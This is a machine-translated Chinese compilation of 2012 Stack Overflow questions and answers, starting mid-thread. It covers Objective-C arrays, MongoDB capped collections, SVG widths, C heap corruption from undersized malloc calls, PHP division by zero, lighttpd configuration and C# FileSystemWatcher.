year.text=StockOpens[5]; 
```

我怎样才能做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:58:25.663

StockOpens 是一个数组对象，因此您需要调用一个方法来获取索引处的对象。在 NSMutableArray 上，它的 [StockOpens ObjectAtIndex:5]

```
year.text = [[StockOpens objectAtIndex:5]StringValue]; 
```

要执行 StockOpens[5]，您需要使用 C 数组。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:31:36.180

从 Xcode 4.4 (LLVM 4.0) 开始，文字可用于 Objective-C 中的 C 样式下标。

```
year.text = StockOpens[5]; 
```

LLVM 在这里记录了文字的使用：[Objective-C Literals](http://clang.llvm.org/docs/ObjectiveCLiterals.html)

注意：因为 Clang 会翻译文字用法，在这种情况下`objectAtIndexedSubscript:`，需要 OS X v10.8（或 iOS 6）Foundation 框架。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T17:39:48.857

这取决于您填充的对象类型/类别`StockOpens`，如果它只是 NSStrings，您可以这样做

```
year.text = [StockOpens objectAtIndex:5]; 
```

如果它是不是字符串的其他对象，您可以调用它的描述：

```
year.text = [[StockOpens objectAtIndex:5] description]; 
```

P.s.：developer.apple.com 上有文档，请阅读！这个问题是如此简单（和基本），所以不能在 SO 上问它。

# in-app-billing - Google 应用内计费示例应用：“找不到错误项目”

> ID：11702943
> 
> 赞同：0
> 
> 时间：2012-07-28T16:56:34.447
> 
> 标签：in-app-billing, google-play

我正在尝试设置应用内计费示例应用程序。我已将其作为“未发布”上传到 Google Play 我已设置了 Sword_001 项目并发布了它。

现在我正在尝试从手机上的示例应用程序购买该商品，它总是说“找不到商品”

有任何想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T16:30:20.550

如果您按照此处提供的步骤操作：http: [//developer.android.com/guide/google/play/billing/billing_testing.html](http://developer.android.com/guide/google/play/billing/billing_testing.html)

那么您应该可以在应用计费中进行。我发现的几件事是：
1.您需要设置一个测试帐户，它不是您的开发者帐户
2.确保您发布应用内产品
3.第三步是等待一段时间或更长时间让谷歌更新他们服务器

首先，您的应用程序将返回未找到的项目，如果您等待，它们将更改为您的项目已找到但无法购买，如果您再等一个小时左右（我不知道确切的时间）然后您的产品应该可以访问。

祝你好运

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-24T23:20:37.757

我的问题就是这么简单：

*   我刚刚将 Google Play 上的项目从“未激活”设置为“已激活”

# c# - 修剪两点之间的字符串

> ID：11702946
> 
> 赞同：0
> 
> 时间：2012-07-28T16:56:51.093
> 
> 标签：c#, .net, windows

我有一个字符串如下：

```
ListViewSubItem: {Debian6/Debian6.vmx } 
```

获得以下输出的最有效方法是什么：

```
Debian6/Debian6.vmx 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:01:33.953

```
int beginidx = haystack.IndexOf('{');
string needle = haystack.SubString(beginidx,
                                   haystack.IndexOf('}') - beginidx + 1).Trim(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:00:37.320

您可以使用正则表达式：

```
\{\s*(.*)\s*\} 
```

所需的字符串将位于第一个捕获的组 ( `Match.Groups[1]`) 中。

例子：

```
string output = Regex.Match(input, @"\{\s*(.*?)\s*\}").Groups[1].Value; 
```

正如所指出的，正则表达式比普通字符串操作慢。如果性能是一个问题，并且字符串提取处于紧密循环中，那么使用优化的方法可能会更好。否则，正则表达式与字符串在恕我直言是个人喜好问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T17:03:29.060

`string result = Regex.Match("ListViewSubItem: {Debian6/Debian6.vmx }", @"(?<={)(.+?)(?=})").Value;`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T17:34:25.423

我猜你自己没有生成那个字符串。所以问题是，为什么要解析它？这看起来像是你应该退后一步想想你想要解决的问题，以及另一种方法是否可能更清洁的问题。

我`ListViewSubItem`对这门课不熟悉，但似乎你有其中之一，你已经调用`ToString()`了它。现在您正在解析的输出`ToString()`以查看您的子项所代表的模型对象。

这在你看来不是倒退吗？也许您应该处理`ListViewSubItem`对象本身（通过简要查看文档，您想要的似乎是`Text`属性），而不是摆弄`ToString()`返回的内容，这似乎是不稳定的并且取决于该类`ToString()`方法的实现（虽然可能不会，理论上可以从发布到发布）。更不用说像“如果字符串包含`}`字符怎么办？”这样的极端情况。

出于其他原因，作为一般规则，我认为当您的数据源一直在内存中时，您不必处理序列化。

所以，总而言之，如果你有这样的事情：

```
 ListViewSubItem item = /* ... */;

  string s = item.ToString();

  // TODO: parse {Debian} out of ListViewSubItem {Debian} 
```

为什么不这样做：

```
 ListViewSubItem item = /* ... */;

  string OS = item.Text; 
```

# mongodb - MongoDB：上限集合 findAndModify

> ID：11702948
> 
> 赞同：0
> 
> 时间：2012-07-28T16:56:55.557
> 
> 标签：mongodb, findandmodify

如果上限集合为空，我试图以原子方式插入一个空文档，如果不为空，则返回最后一个自然排序的文档。我可以用 findAndModify 做到这一点吗？

```
db.collection.findAndModify({
    query: { _id: { $exists: true }},
    sort: { $natural: -1 },
    update: {},
    upsert: true,
    new: true
}); 
```

我本来希望这要么返回最新的文档（如果集合不为空），要么插入一个新文档（如果不存在），但是，它每次调用时都会插入一个空白文档（没有_id）。findAndModify 是否适用于有上限的集合？我需要添加的文档有一个`_id`.

谢谢。

-斯科特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T14:36:11.567

> 如果上限集合为空，我试图以原子方式插入一个空文档，如果不为空，则返回最后一个自然排序的文档。我可以用 findAndModify 做到这一点吗？

您的查询逻辑存在缺陷。一个 findAndModify() ：

> ```
> query: { _id: { $exists: true }},
> sort: { $natural: -1 },
> update: {},
> upsert: true,
> new: true 
> ```

... 将要：

*   `_id`使用集合对最后插入的记录进行更新

    或者

*   如果没有找到带有 an 的现有文档，则插入一个新的（空）文档`_id`。

该更新将用一个空的记录替换您最后插入的记录..这可能不是预期的结果:)。

您看到的是一个完全空的文档（没有`_id`字段），因为上限集合对标准集合的行为有一些例外。

尤其是：

*   默认情况下不需要`_id`字段；您可以通过包含[autoIndexId:true](http://www.mongodb.org/display/DOCS/Capped+Collections#CappedCollections-autoIndexId)选项在服务器上生成一个`createCollection()`

*   字段上没有索引`_id`（注意：如果使用带有上限集合的*复制，您***将**需要一个唯一索引）

 *另请注意，上限集合中的文档[不得增长，](http://www.mongodb.org/display/DOCS/Capped+Collections#CappedCollections-UsageandRestrictions)否则更新将失败

有关更多信息，请参阅wiki 上的[Capped Collection Usage & Restrictions 。](http://www.mongodb.org/display/DOCS/Capped+Collections#CappedCollections-UsageandRestrictions)*

# javascript - 如何获取 svg:g 元素的宽度

> ID：11702952
> 
> 赞同：70
> 
> 时间：2012-07-28T16:57:10.793
> 
> 标签：javascript, jquery, svg, width

我目前正在使用`svg`JavaScript 中的一个元素。我对此很陌生。

我的问题是我有一个`svg`元素，其中我有多个`svg:g`元素。在我的`svg:g`元素中，我还有其他各种 svg 元素。

```
 <svg>
     <g class="my-class">
      <g class "c1">
         <text style="font-size: 9" x="0" y="-4"> john </text>
         <text style="font-size: 9" x="70" y="-4"> 13 </text>
      </g> 
      <g class="c2">
         <text style="font-size: 9" x="0" y="-4"> john </text>
         <text style="font-size: 9" x="70" y="-4"> 13 </text>
      </g> 
      <g class="c3">
         <text style="font-size: 9" x="0" y="-4"> john </text>
         <text style="font-size: 9" x="70" y="-4"> 13 </text>
      </g> 
    </g>
   </svg> 
```

`g`动态附加在我的

> g“我的班级”

现在我想设置我的`svg`宽度等于宽度的`g.my_class`宽度。

```
var svgWidth  =   $('.my-class').width()
alert(svgWidth); 
```

但它给了我零。我怎么能在我的浏览器上的黄色工具提示框中看到它![在此处输入图像描述](../Images/da1bf4ccd16eebfe6cd62a4332b1d892.png)

当我选择这条线时。

任何人都可以指导我吗？我做对了吗，或者我怎样才能做到这一点？谢谢

* * *

## 回答 #1

> 赞同：101
> 
> 时间：2012-07-28T17:09:11.220

尝试`.getBoundingClientRect`

```
$('.my-class')[0].getBoundingClientRect().width; 
```

演示[http://jsfiddle.net/5DA45/](http://jsfiddle.net/5DA45/)

* * *

## 回答 #2

> 赞同：92
> 
> 时间：2012-08-08T15:15:17.657

我建议`getBBox`（它是 SVG 1.1 的一部分）`getBoundingClientRect`而不是（不是）：

```
$('.my-class')[0].getBBox().width; 
```

演示[http://jsfiddle.net/TAck4/](http://jsfiddle.net/TAck4/)

# google-app-engine - 未找到 Gradle、gae、appengine-web.xml 和 web.xml

> ID：11702956
> 
> 赞同：1
> 
> 时间：2012-07-28T16:58:03.213
> 
> 标签：google-app-engine, gradle

我刚开始使用 gae 插件。问题是当我运行 gradle gaeRun 时出现异常：

com.google.apphosting.utils.config.AppEngineConfigException：找不到../myapp/build/exploded-war/WEB-INF/appengine-web.xml

到目前为止，我设法通过在我的 gradle.build 脚本中添加以下内容来解决这个问题：

```
gaeRun.doFirst{
copy {
    from('war/WEB-INF/') {
        include '**/*'
    }

    into 'build/exploded-war/WEB-INF/'
 }
} 
```

这是正确的方法吗？下面是整个脚本：

```
apply plugin: 'gae'
apply plugin: 'eclipse'
apply plugin: 'scala'

task wrapper(type: Wrapper) {
gradleVersion = '1.0'
}

buildscript {
repositories { mavenCentral() }
dependencies { 
    classpath 'org.gradle.api.plugins:gradle-gae-plugin:0.7.6' 
}
}

repositories {
mavenCentral()
}

dependencies {
scalaTools 'org.scala-lang:scala-compiler:2.9.1'
scalaTools 'org.scala-lang:scala-library:2.9.1'

compile 'org.scala-lang:scala-library:2.9.1'
testCompile group: 'junit', name: 'junit', version: '4.8.2'
}

gae {
httpPort = 8085
optimizeWar = true

appcfg {
    email = 'email@gmail.com'
    passIn = true

    logs {
        severity = 1
        outputFile = file('mylogs.txt')
    }

    app { id = 'sample-app' }
}
}

gaeRun.doFirst{
    copy {
        from('war/WEB-INF/') {
        include '**/*'
    }

        into 'build/exploded-war/WEB-INF/'
 }
} 
```

# c - 释放分配的内存时堆损坏 (C)

> ID：11702959
> 
> 赞同：0
> 
> 时间：2012-07-28T16:58:22.760
> 
> 标签：c, pointers, malloc, free, heap-corruption

我正在动态分配内存以维护项目列表，但是在尝试使用 删除项目时`free()`，出现内存堆损坏错误。而且我知道这在 C++（或 java，或任何其他面向对象的语言）中会容易得多，但我必须在 C 中执行此操作（注意：C 代码，但在 Microsoft Visual Studio 2010 中编译，并且因此是 C++ 编译器）。

这是项目“看起来”的样子：

```
//item.h
typedef struct 
{
    char* titel;
    char* auteur;
    int jaar;
} Boek;

typedef struct
{
enum {BOEK, TIJDSCHRIFT} itemType;
    union {
        Boek* boek;
        Tijdschrift* tijdschrift;
    } itemData;
    struct Item* next;
} Item; 
```

这是它的创建/分配方式。我还在使用`strdup`和`malloc`/`strcpy`分配字符串之间进行了切换，但这似乎没有任何效果。此外，我要删除的项目属于该`BOEK`类型，但`TIJDSCHRIFT`分配器/释放器的工作方式类似。

```
//item.c
Item* nieuwBoek(char* _titel, char* _auteur, int _jaar)
{
    Item* item = (Item*) malloc(sizeof(Item*));
    item->itemType=BOEK;
    item->itemData.boek=(Boek*) malloc(sizeof(Boek*));
    item->itemData.boek->titel=strdup(_titel);
    item->itemData.boek->auteur=strdup(_auteur);
    item->itemData.boek->jaar=_jaar;
    item->next=NULL;
    return item;
} 
```

然后返回的指针被另一个函数使用，该函数将它传递给`item->next`列表中前一项的。

这是我试图释放它的方法。我的理解是，我必须在释放结构本身之前释放分配的字符串，但即使我只是调用 free(item) （通过在主代码中注释掉其他代码`deleteItem`或在主代码中调用它：`free(nieuwBoek(...)`我得到堆损坏错误。

```
void deleteItem(Item* item)
{
    if (item->itemType==BOEK)
    {
        free(item->itemData.boek->titel); // When not running in debug-mode it crashes here.
        free(item->itemData.boek->auteur);
        free(item->itemData.boek); // When running in debug mode it crashes here.
    }
    /*else if... TIJDSCHRIFT deallocator here*/
    free(item); 
} 
```

并且传递给`deleteItem()`的指针是指向项目的有效指针。它可能是我做错/失踪的一些非常愚蠢的事情，但我现在整天都被这个问题难住了，所以我向你们寻求帮助。哦，并且`next->pointer`设置为`NULL`在删除项目之前，所以它已经从列表中断开，如果这很重要的话。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T17:00:15.910

> ```
> Item* item = (Item*) malloc(sizeof(Item*)); 
> ```

您应该将其更改`sizeof`为`sizeof(Item)`or `sizeof(*item)`。否则，您将仅分配足够的空间来容纳指针，而对于您的结构来说还不够。

我个人更喜欢`sizeof *item`- 这样如果我改变它的类型，我只需要在一个地方做。

* * *

旁注：

*   腐败意味着什么：由于您分配的内存很少，当您填写结构字段以弄乱内部簿记时`malloc`，下一个操作检测到它
*   尽管是个人喜好问题，但您可能不应该将 return`malloc`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T17:00:45.207

这个：

```
Item* item = (Item*) malloc(sizeof(Item*)); 
```

只为*指针*分配足够的空间。您想为整个`Item`结构分配足够的空间：

```
Item* item = (Item*) malloc(sizeof(Item)); 
```

同样，这个分配：

```
item->itemData.boek=(Boek*) malloc(sizeof(Boek*)); 
```

应该：

```
item->itemData.boek=(Boek*) malloc(sizeof(Boek)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-03-24T17:48:18.183

晚会发帖，但 Valgrind 检测到此类问题。我遇到了这个问题，这让我发疯了，因为 GCC 会允许程序运行，但 VC2012 每次都会崩溃。Valgrind 展示了以下内容：

```
    大小为 8 的无效写入
        在 0x10CC33: appendListItem (structMgmt.c:170)
        由 0x10BB6E: 解析 (parse.c:304)
        由 0x10A790：runParsingTests (CTSLicense.c:562)
        通过 0x109B7F: 主要 (CTSLicense.c:41)
    地址 0x5207748 是一个大小为 8 的块分配后的 0 个字节
        在 0x4C2CB3F：malloc（在 /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so 中）
        由 0x10CC2A: appendListItem (structMgmt.c:169)
        由 0x10BB6E: 解析 (parse.c:304)
        由 0x10A790：runParsingTests (CTSLicense.c:562)
        通过 0x109B7F: 主要 (CTSLicense.c:41)

```

这非常令人困惑（我已经知道 C 2 周了）。我不小心为指针而不是结构使用了 malloc。现在我的程序在 GCC 和 VC2012 中运行没有任何问题。

使用 Microsoft 的 pageheap 检测工具对于查找问题的根本原因并不是很有帮助。它确实告诉我存在堆损坏而不是出现的其他愚蠢错误，但不是问题的根源。

[微软的堆检测工具](https://stackoverflow.com/questions/2470131/visual-studio-how-to-find-source-of-heap-corruption-errors)

[使用 valgrind 查找此问题的提示](https://stackoverflow.com/questions/27636306/valgrind-address-is-0-bytes-after-a-block-of-size-8-allocd)

# linux - 如何为 ARM Integrator Target Machine 生成工具链的内核头文件

> ID：11702960
> 
> 赞同：2
> 
> 时间：2012-07-28T16:58:24.360
> 
> 标签：linux, header, kernel, arm, linux-toolchain

我正在尝试为 ARM Integrator 目标机器从头开始构建工具链。我从构建 binutils 开始，没问题。现在我必须生成内核头文件，但我不知道如何以正确的方式执行此操作。任何帮助都会很有用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-12-10T02:44:32.930

我为此搜索了很多，以便交叉编译 gcc。

本例涉及linux-3.9的源码。

```
#cd to the top directory of the kernel source
cd linux-3.9
make mrproper
make ARCH=arm integrator_defconfig
make ARCH=arm headers_check
make ARCH=arm INSTALL_HDR_PATH=$SOMEWHERE headers_install 
```

变量 $SOMEWHERE 是您想要提取它的位置。

如果您想要积分器以外的东西怎么办？如何发现？假设您仍然在内核源代码树的顶层目录中，`_defconfig`您可以使用以下其他目录：

```
ls /arch/arm/configs/* 
```

其他架构的同上。

**注意**：如果您使用 newlib 而不是 glibc 构建交叉工具链，则不需要内核头文件。你应该使用哪个库？这取决于您的需求。newlib 针对嵌入式解决方案。

资料来源：

[http://pmc.polytechnique.fr/pagesperso/dc/arm-en.html](http://pmc.polytechnique.fr/pagesperso/dc/arm-en.html)

[http://www.ifp.illinois.edu/~nakazato/tips/xgcc.html](http://www.ifp.illinois.edu/~nakazato/tips/xgcc.html)

[http://www.gentoo.org/proj/en/base/embedded/handbook/?part=1&chap=2](http://www.gentoo.org/proj/en/base/embedded/handbook/?part=1&chap=2)

# php - 如何安全地使用 api 密钥

> ID：11702964
> 
> 赞同：3
> 
> 时间：2012-07-28T16:59:00.053
> 
> 标签：php, api, security

我将制作一个简单的网络应用程序。它最多只有几页，应用程序的主要焦点是调用 api 并使用该信息进行处理。

我想知道保护我的 api 密钥安全的最佳方法是什么。有没有我可以使用的非常轻量级的框架？我应该只在根目录创建一个 php 页面吗？我可以用 codeigniter 构建一些东西，但这似乎对我的需要来说太多了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T17:00:23.690

将 API 密钥保存在 Web 根目录之外的文件中。然后将该文件包含在需要使用它的任何文件中。通过将其置于 Web 根目录之外，无法通过 Web 浏览器或其他类似方式直接访问它。

```
<?php
    // Assuming this file is in the web root
    require('../api_keys.php'); 
```

# objective-c - Cocos2d v2 + Chipmunk：向 CCLayer 添加形状时失败

> ID：11702982
> 
> 赞同：0
> 
> 时间：2012-07-28T17:00:53.703
> 
> 标签：objective-c, ios, cocos2d-iphone, chipmunk

我对 Cocos2d 和 Box2d 非常有经验，想试试 Chipmunk。只要我将精灵添加到 helloworldlayer，一切都可以正常工作，但是如果我添加另一个图层并尝试将精灵添加到该新图层，它会崩溃。

它在主层更新中的 cpSpaceStep 函数调用中出现 EXC_BAD_ACCESS 失败。

```
-(void) update:(ccTime) delta
{
    // Should use a fixed size step based on the animation interval.

    int steps = 2;
    CGFloat dt = [[CCDirector sharedDirector] animationInterval]/(CGFloat)steps;

    for(int i=0; i<steps; i++){
        HERE -> cpSpaceStep(space_, dt);
    }

} 
```

编辑：问题似乎与精灵批处理节点有关，而不是 CCLayers。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T18:38:16.577

Chipmunk 实际上并不直接与 Cocos2D 交互，它只是一个物理引擎。因此，如果它在 cpSpaceStep() 中使用 EXC_BAD_ACCESS 崩溃，那几乎可以肯定是因为您在某个地方给了 Chipmunk 一个悬空指针，或者有另一个内存错误破坏了 Chipmunk 正在使用的数据。

如果将其编译为调试，它究竟在哪里崩溃？您是否使用任何回调并确定其中一个没有发生？

# xml - xquery：如何检查输入 xml 中缺少的标签？

> ID：11702984
> 
> 赞同：-1
> 
> 时间：2012-07-28T17:01:33.587
> 
> 标签：xml, xquery

在使用 Xquery 将 xml 映射到另一个（都具有不同的模式）时，我遇到了这个问题，即输入 xml“有时”不包含某些标签，有时它包含。我希望我的 xquery 检查输入是否存在，然后才应该创建输出 xml 的相应标签。检查每个标签的输入值是否是强制性的？我想要一个简化的方法来实现这个目标。

任何人都可以提出一些建议吗？

谢谢和问候，曼西

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T08:29:51.203

嗯...这可能是一种“简化”的方法来检查标签 foo 是否存在于您的“input.xml”中

```
fn:exists($input-xml//*[local-name() = "foo"]) 
```

...如果您想测试标签 foo 是否具有文本值 bar，请输入另一个谓词：

```
fn:exists($input-xml//*[local-name() = "foo"][text() = "bar"] 
```

# php - 警告：/home/ 中除以零

> ID：11702988
> 
> 赞同：-2
> 
> 时间：2012-07-28T17:02:14.757
> 
> 标签：php, mysql

我已经搜索了这个问题，但找不到它，我有一个脚本给我这个警告警告：第 52.php 行的 /home/ 中除以零 - 你可以在[http://usedcarsforsaleingauteng.com上看到错误/](http://usedcarsforsaleingauteng.com/)

如果你看下面，$pages = ceil($total / $_GET[p]); // 页数为第 52.php 行

你们能帮忙吗？谢谢

```
// get total number of entries for pagenation
$result = mysql_query("SELECT COUNT(*) FROM $dblist $where", $link);
$total  = mysql_fetch_array($result); $total = $total[0]; // total number of listings
$pages  = ceil($total / $_GET[p]); // number of pages
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T17:07:10.157

`$_GET['p']`最好的方法是在进行除法之前检查是否为 0，例如；

```
$pages = ($_GET['p']==0) ? 1 : ceil($total / $_GET['p']); 
```

或者任何你想`$pages`成为的东西，如果`$_GET['p']`是 0（在上面的例子中我只是假设 1）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:07:49.447

`$_GET[p]`可能是未定义的。您应该检查它是否存在：

```
if(isset($_GET['p'])) {
    $p = (int) $_GET['p'];
    // Your code
    if($p != 0)
        $pages  = ceil($total / $p);
    else {
        // Do errorhandling e.g. setting $page = 0
    }
} 
```

另请注意，您应该始终编写`$_GET['p']`而不是`$_GET[p]`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T17:08:38.320

你应该使用`$_GET['p']`not `$_GET[p]` （注意 ' ）

我刚刚查看了您的网站并看到了错误。`$_GET['p']`如果未随 url 提供变量，则不会将变量设置为后备值。

当您访问[http://usedcarsforsaleingauteng.com/](http://usedcarsforsaleingauteng.com/)时，您会看到错误，但不是：[http ://usedcarsforsaleingauteng.com/?p=1](http://usedcarsforsaleingauteng.com/?p=1)

您应该有一个后备值：

```
if($_GET['p']){
 $page = $_GET['p'];
} else{
 $page = 1;
}
$pages  = ceil($total / $page); 
```

# lighttpd - lighttpd.conf - 文档根目录作为包含配置文件的目录

> ID：11702989
> 
> 赞同：3
> 
> 时间：2012-07-28T17:02:21.997
> 
> 标签：lighttpd

我想使用 lighttpd 作为开发服务器，类似于用于 Rails 或`manage.py runserver`Django 的 WEBrick。（这适用于 PHP 和学习 Javascript，我不能在本地文件系统上使用 AJAX）。我还希望能够通过将 conf 文件与代码一起签入到源代码控制来与其他开发人员共享结果，因此我想要相对于 conf 文件的路径，而不是仅在我的系统上有效的绝对路径。

所以我看到了[这个关于使用 lighttpd 的答案](https://stackoverflow.com/a/5438057/3189)，它非常接近我想要的。但是，不必更改到正确的目录然后运行脚本，理想情况下我希望能够做到：

```
lighttpd -f path/to/lighttpd.conf 
```

并且文档根目录相对于 lighttpd.conf 文件所在的目录。所以我希望能够有一个类似的配置行：

```
server.document-root = dirname(__file__) + "/html" 
```

链接到上面的答案`CWD`用于目录，所以这似乎很可能是可用的。知道如何指定它吗？

*（作为旁注，任何人都可以链接到一个全面的参考`lighttpd.conf`和可用的选项吗？我一直找不到。）*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-15T08:22:52.670

这是不可能的——你应该（你已经知道）

```
cd /some/testing/dir/with/your/stuff
lighttpd -f lighttpd.conf 
```

加上`var.CWD`你的目录

```
server.document-root = var.CWD 
```

另一种方法是使用提供附加伪 chroot 参数的选项自己修补 lighttpd。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-24T11:23:15.130

您可以调用`envsubst`您的配置、设置`$PWD`或其他一些变量

`envsubst < lighttpd.conf.template > lighttpd.conf`

# php - 如何查看用户正在使用的浏览器（和版本）？

> ID：11702990
> 
> 赞同：0
> 
> 时间：2012-07-28T17:02:23.513
> 
> 标签：php, javascript, cross-browser

由于 CSS3 和 HTML5，我想检查访问者使用的浏览器（和版本）。最好的方法是什么？我知道大多数方式都会搞砸某些检查，例如手机或平板电脑，以及一些不常见的浏览器，但应该有一种方法可以正确获取这些信息？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-28T17:04:30.520

我建议你看看[Modernizr](http://modernizr.com/)。这是一个 js 库，可以满足您的需求

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:06:05.243

无需 JS 库或其他包含文件！

```
$browser = get_browser(null, true);
echo $browser['browser']; 
```

这将返回类似“Firefox”、“Opera”、“Safari”等的内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T17:08:58.740

您可以为此使用 PHP

```
<?php
echo $_SERVER['HTTP_USER_AGENT'] . "\n\n";
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T18:02:01.910

```
$browser = $_SERVER['HTTP_USER_AGENT']; 
```

或者您可以使用谷歌分析查看访问者的实时数据

# c# - Filesystemwatcher 不触发事件

> ID：11702993
> 
> 赞同：0
> 
> 时间：2012-07-28T17:02:49.450
> 
> 标签：c#, filesystemwatcher

我正在尝试使用`FileSystemWatcher`类监视目录中的新文件。

我的问题是事件没有被触发。我的观察者类是：

```
public class Filewatcher
{
    private FileSystemWatcher watcher;

    public Filewatcher(string path, string filefilter)
    {
        this.watcher = new FileSystemWatcher();
        this.watcher.Path = path;
        this.watcher.NotifyFilter = NotifyFilters.FileName; //| NotifyFilters.LastWrite | NotifyFilters.LastAccess
        this.watcher.Filter =  filefilter;
        this.watcher.Created += new FileSystemEventHandler(OnChanged);
    }

    public void start_watching()
    {
        //this.watcher.IncludeSubdirectories = true;
        this.watcher.EnableRaisingEvents = true;

        Console.WriteLine("Press Enter to quit\r\n");
        Console.ReadLine(); 
    }

    private static void OnChanged(object source, FileSystemEventArgs e)
    {
        //FileInfo objFileInfo = new FileInfo(e.FullPath);
        //if (!objFileInfo.Exists) return;
        Console.WriteLine("got the change\r\n");
        global_functions.perform_action(Global_Vars.thereader.read(e.FullPath), Global_Vars.thepattern);
    }
} 
```

操作系统是 Win 7 Prof x64

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T18:02:44.763

您无需调用 start_watching()。添加一个电话，它可能会更好。